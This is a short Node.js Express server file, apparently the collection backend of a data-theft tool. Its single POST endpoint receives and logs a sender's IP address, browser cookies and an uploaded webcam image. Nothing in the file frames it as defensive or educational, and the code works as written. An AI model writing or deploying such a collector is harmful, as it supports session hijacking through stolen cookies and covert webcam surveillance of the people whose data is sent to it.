const express = require("express");
const multer = require("multer");
const upload = multer();

const app = express();

app.use(express.json());

app.post("/", upload.single("webcam_image"), (req, res) => {
  const { ip, cookies } = req.body;
  console.log("Received IP:", ip);
  console.log("Received Cookies:", cookies);

  if (req.file) {
    console.log("Webcam image received:", req.file.originalname);
  }

  res.send("Data received successfully!");
});

app.listen(3000, () => {
  console.log("Server running on http://10.0.1.33:3000");
});
